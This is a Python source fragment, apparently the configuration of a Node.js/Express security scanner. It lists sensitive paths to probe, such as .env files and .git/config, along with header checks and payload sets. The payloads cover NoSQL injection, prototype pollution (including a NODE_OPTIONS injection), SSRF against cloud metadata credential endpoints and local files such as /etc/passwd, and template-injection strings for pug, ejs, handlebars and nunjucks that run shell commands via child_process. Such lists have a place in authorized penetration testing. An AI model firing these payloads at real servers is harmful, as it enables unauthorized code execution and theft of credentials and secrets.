R    = "\033[38;5;196m"
R2   = "\033[38;5;160m"
R3   = "\033[38;5;124m"
B    = "\033[38;5;27m"
B2   = "\033[38;5;33m"
B3   = "\033[38;5;39m"
W    = "\033[38;5;255m"
W2   = "\033[38;5;250m"
Y    = "\033[38;5;226m"
O    = "\033[38;5;208m"
G    = "\033[38;5;46m"
G2   = "\033[38;5;40m"
C    = "\033[38;5;51m"
M    = "\033[38;5;201m"
P    = "\033[38;5;141m"
D    = "\033[38;5;240m"
D2   = "\033[38;5;238m"
BOLD = "\033[1m"
N    = "\033[0m"
E    = N

# ── Node.js Recon Paths ───────────────────────────────
NODE_PATHS = [
    "/.env", "/.env.local", "/.env.production", "/.env.development",
    "/.env.staging", "/.env.test", "/.env.backup", "/.env.old",
    "/package.json", "/package-lock.json", "/yarn.lock",
    "/npm-debug.log", "/yarn-error.log",
    "/.npmrc", "/.yarnrc", "/.nvmrc",
    "/server.js", "/app.js", "/index.js", "/main.js",
    "/config.js", "/config.json", "/config/default.json",
    "/config/production.json", "/config/development.json",
    "/.git/HEAD", "/.git/config", "/.gitignore",
    "/.dockerignore", "/Dockerfile", "/docker-compose.yml",
    "/.eslintrc.json", "/.prettierrc", "/tsconfig.json",
    "/webpack.config.js", "/next.config.js", "/nuxt.config.js",
    "/.next/", "/.nuxt/", "/build/", "/dist/",
    "/node_modules/.package-lock.json",
    "/robots.txt", "/sitemap.xml",
    "/health", "/healthz", "/ready", "/readyz", "/status",
    "/metrics", "/prometheus", "/_health",
    "/debug", "/debug/pprof", "/inspect",
    "/api-docs", "/swagger.json", "/openapi.json",
    "/graphql", "/graphiql", "/playground",
    "/admin", "/dashboard", "/panel",
    "/.well-known/security.txt",
]

# ── Express.js Audit ──────────────────────────────────
EXPRESS_PATHS = [
    "/", "/api", "/api/v1", "/api/v2",
    "/api/users", "/api/user", "/api/auth", "/api/login",
    "/api/register", "/api/admin", "/api/config",
    "/api/health", "/api/status", "/api/debug",
    "/api/docs", "/api/swagger", "/api/graphql",
    "/api/upload", "/api/files", "/api/search",
    "/api/products", "/api/orders", "/api/payments",
    "/static/", "/public/", "/assets/", "/uploads/",
    "/favicon.ico", "/robots.txt",
]

EXPRESS_HEADERS_CHECK = {
    "x-powered-by": {"bad": True, "msg": "Express fingerprint exposed (remove via app.disable)"},
    "x-frame-options": {"bad": False, "msg": "Missing clickjacking protection (use helmet)"},
    "x-content-type-options": {"bad": False, "msg": "Missing MIME sniff protection (use helmet)"},
    "strict-transport-security": {"bad": False, "msg": "Missing HSTS header"},
    "content-security-policy": {"bad": False, "msg": "Missing CSP header"},
    "x-xss-protection": {"bad": False, "msg": "Missing XSS filter header"},
    "access-control-allow-origin": {"bad": None, "msg": "CORS configured — check if wildcard"},
}

# ── NoSQL Injection Payloads ──────────────────────────
NOSQL_PAYLOADS = [
    '{"$gt":""}', '{"$ne":null}', '{"$ne":""}',
    '{"$gt":0}', '{"$gte":0}', '{"$lt":99999}',
    '{"$in":["admin"]}', '{"$regex":".*"}',
    '{"$where":"this.username==this.password"}',
    '{"$exists":true}', '{"$type":"string"}',
    '{"$not":{"$eq":""}}',
]

NOSQL_PARAMS = ["username", "email", "password", "user", "login",
                "id", "name", "search", "q", "query", "filter",
                "role", "admin", "token", "key"]

# ── Prototype Pollution Payloads ──────────────────────
PROTO_PAYLOADS = [
    '{"__proto__":{"isAdmin":true}}',
    '{"__proto__":{"polluted":"yes"}}',
    '{"constructor":{"prototype":{"isAdmin":true}}}',
    '{"__proto__":{"shell":"node2shell"}}',
    '{"__proto__":{"toString":"polluted"}}',
    '{"__proto__":{"env":{"NODE_OPTIONS":"--require /tmp/x"}}}',
]

PROTO_PARAMS = ["data", "body", "payload", "input", "config",
                "options", "settings", "user", "profile", "merge"]

# ── JWT Test ──────────────────────────────────────────
JWT_PATHS = [
    "/api/auth/login", "/api/login", "/auth/login", "/login",
    "/api/token", "/api/auth/token", "/token",
    "/api/auth/register", "/api/register", "/register",
    "/api/auth", "/auth",
]

JWT_HEADERS = [
    "Authorization", "X-Auth-Token", "X-Access-Token",
    "X-JWT-Token", "Token", "Bearer",
]

# ── SSRF Payloads ─────────────────────────────────────
SSRF_PAYLOADS = [
    "http://127.0.0.1", "http://localhost", "http://0.0.0.0",
    "http://[::1]", "http://169.254.169.254",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/",
    "http://127.0.0.1:3000", "http://127.0.0.1:8080",
    "http://127.0.0.1:6379", "http://127.0.0.1:27017",
    "http://127.0.0.1:9200", "http://127.0.0.1:5432",
    "file:///etc/passwd", "file:///proc/self/environ",
    "gopher://127.0.0.1:6379/_INFO",
]

SSRF_PARAMS = ["url", "uri", "link", "href", "redirect", "redirect_uri",
               "callback", "return", "return_url", "next", "target",
               "dest", "destination", "image_url", "fetch", "load",
               "proxy", "host", "site", "page", "path", "document",
               "feed", "port", "to", "out", "view", "dir", "show",
               "navigation", "open", "reference", "website", "api"]

# ── GraphQL ───────────────────────────────────────────
GRAPHQL_PATHS = [
    "/graphql", "/api/graphql", "/graph", "/gql",
    "/graphql/v1", "/graphql/v2", "/query",
    "/api/query", "/v1/graphql", "/v2/graphql",
]

INTROSPECTION_QUERY = '{"query":"{ __schema { types { name fields { name } } } }"}'

# ── SSTI Payloads ─────────────────────────────────────
SSTI_PAYLOADS = {
    "generic": [
        "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}",
        "{{7*'7'}}", "${7*'7'}",
    ],
    "pug": [
        "#{7*7}", "#{process.mainModule.require('child_process').execSync('id')}",
        "- var x = process.mainModule", "#{root.process.mainModule.require('child_process').execSync('id')}",
    ],
    "ejs": [
        "<%= 7*7 %>", "<%- 7*7 %>",
        "<%= process.mainModule.require('child_process').execSync('id') %>",
        "<%= global.process.mainModule.require('child_process').execSync('id') %>",
    ],
    "handlebars": [
        "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |cod|}}{{#with (apply cod \"return process.mainModule.require('child_process').execSync('id')\")}}{{this}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}",
    ],
    "nunjucks": [
        "{{7*7}}", "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}",
        "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{%endfor%}",
    ],
}

SSTI_PARAMS = ["name", "template", "view", "page", "content",
               "title", "message", "text", "body", "input",
               "username", "email", "comment", "bio", "description"]

# ── Source Map Paths ──────────────────────────────────
SOURCEMAP_PATHS = [
    "/static/js/main.js.map", "/static/js/bundle.js.map",
    "/static/js/app.js.map", "/static/js/chunk.js.map",
    "/js/main.js.map", "/js/app.js.map", "/js/bundle.js.map",
    "/build/main.js.map", "/dist/main.js.map",
    "/_next/static/chunks/main.js.map",
    "/_next/static/chunks/webpack.js.map",
]

# ── Debug Port ────────────────────────────────────────
DEBUG_PORTS = [9229, 9230, 9231, 5858, 5859]
